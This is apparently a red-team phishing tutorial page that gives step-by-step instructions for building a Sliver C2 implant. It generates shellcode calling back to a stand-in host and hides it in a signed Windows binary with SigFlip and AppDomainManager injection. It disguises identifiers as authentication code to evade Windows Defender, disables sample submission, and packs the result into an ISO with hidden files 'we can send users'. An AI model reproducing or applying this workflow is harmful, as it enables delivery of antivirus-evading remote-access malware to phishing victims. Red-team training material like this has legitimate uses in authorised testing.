+++
title = "Better Payload Generation"
weight = 100
+++

### Better implants (frostbyte bypass windows defender)

Instead of generating a executable. We can generate shellcode. We can then use something like [https://github.com/pwn1sher/frostbyte](https://github.com/pwn1sher/frostbyte) to load that shellcode into memory and execute it.

### Get frostbyte

Lets get download the [frostbyte zip](https://github.com/pwn1sher/frostbyte/archive/refs/heads/main.zip) from Github.

### Generate shellcode

In a sliver shell we need to run the following to generate some shellcode to be used later. We'll use `test.example` as the callback domain, we will add an entry to the Windows hosts file.

```bash
generate --mtls test.example -f shellcode --save implants/shellcodex64.bin
```

Copy the shellcode to your `Desktop\frostbyte-main` folder on the windows machine.

### Setup Files for New Payload

```bat
cd Desktop\frostbyte-main
mkdir AuthHelper
mkdir AuthHelper\dist\
copy Update.exe.config AuthHelper\dist\AuthHelper.exe.config
copy test.cs AuthHelper\AuthHelper.cs
cd AuthHelper
```

### Run SigFlip

Now that we have things setup we can run `SigFlip` to encode our shellcode into the `CasPol.exe` and save it as `AuthHelper.exe` in our newly created `AuthHelper` folder.

```bat
..\SigFlip.exe -i "..\CasPol.exe" "..\shellcodex64.bin" ".\dist\AuthHelper.exe" "PYLD4ME"
```

Pay attention to the output. I had to make note of the padding value and add it to two lines in the `.cs` file

### Update `dist\AuthHelper.exe.config`

- We need to replace `test` with our executabe name our executable name without the extenaion (`AuthHelper`). 
- Next we need to update the value of `appDomainManagerType` to be something else `NewAuthHelper`.
- Finally lets make `privatePath` a relative path `.`

```xml
<configuration>
   <runtime>
      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
         <probing privatePath="."/>
      </assemblyBinding> 
	  <appDomainManagerAssembly value="AuthHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />  
	  <appDomainManagerType value="NewAuthHelper" />  
   </runtime>
</configuration>
```

### Update AuthHelper\AuthHelper.cs

Now we need to update the `AuthHelper.cs` file.

- remove top three lines prepended with `#`
- replace `Z45UDG` with `NewAuthHelper`
- comment out logging on lines `154` and `161`
- replace `S3cretK3y` with `PYLD4ME`
- change `Z:\\zloader\\update.exe` to `AuthHelper.exe`
- replace all instances of `shellcode` with `certData`
- replace all instances of `ClassExample` with `AuthHelper`
- replace all instances of `Executing Beacon!` with `Begin Execution!`
- replace all instances of `Decrypt` with `CheckAuth`
- replace all instances of `ExecShellcode` with `Authorize`
- Update `_peBlob.Length+2` to be `_peBlob.Length+10`


```
C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:dist\AuthHelper.dll AuthHelper.cs
```

### Prepare for Testing

We need to modify `C:\Windows\System32\drivers\etc\hosts` and add an entry for `test.example`.

- Run notepad as administrator
![Run Notepad as Administrator](/static/how-to-phishing/notepad-runas.png)

- Ensure you have show all files selected 
![Notepad Show All Files](/static/how-to-phishing/notepad-open-allfiles.png)

- Browse to `C:\Windows\System32\drivers\etc\`
- Add en antry for `test.example` to go to your Linux box runnning `sliver`.
![Windows Hosts File Entry](/static/how-to-phishing/windows-hosts-entry.png)

We should also set defender to not send off samples.

- Open Windows Defender
![Defender Tray Entry](/static/how-to-phishing/defender-tray.png)

- Select **Virus & threat protection** from the left side navigation.
- Click **Manage settings**
![Defender Settings](/static/how-to-phishing/defender-settings.png)

- Turn off sample submission
![Defender Sample Submission](/static/how-to-phishing/defender-sample-submission.png)

### Testing

Now we should be able to open out `dist` folder and run the `AuthHelper.exe`.
![Better Payload Testing](/static/how-to-phishing/better-payload-testing.png)

We should be see a new session popup in Sliver
![Better Payload Testing Sliver](/static/how-to-phishing/better-payload-testing-sliver.png)

Now would be a good time to fine tune our code, remove debugging messages, or add a nice special message that says "Good job! Now your more secure!!". 

### PackMyPayload

Now that we have a nice payload, lets pack it up so we can send it to our phishing targets. We'll use [https://github.com/mgeeky/PackMyPayload](https://github.com/mgeeky/PackMyPayload)


```bash
sudo apt install python3-pip
cd ~/opt
git clone https://github.com/mgeeky/PackMyPayload.git
cd PackMyPayload
python3 -m pip install -r requirements.txt
```

Copy dist folder to your linux VM. I put it in `~/Desktop/op/payloads/AuthHelper/`.

```bash
cd ~/Desktop/op/payloads/AuthHelper
python3 ~/opt/PackMyPayload/PackMyPayload.py --hide AuthHelper.dll,AuthHelper.exe.config dist AuthHelper.iso -v
```

Now we should have a nice `.iso` file we can send users.
![PackMyPayload](/static/how-to-phishing/packmypayload.png)

### Testing... Again

Now we need to test again to make sure everything is working as designed. Copy the `AuthHelper.iso` to the windows machine. We'd hate for users to receive this message instead of us getting a new session:

![Error](/static/how-to-phishing/iso-mount-error.png)
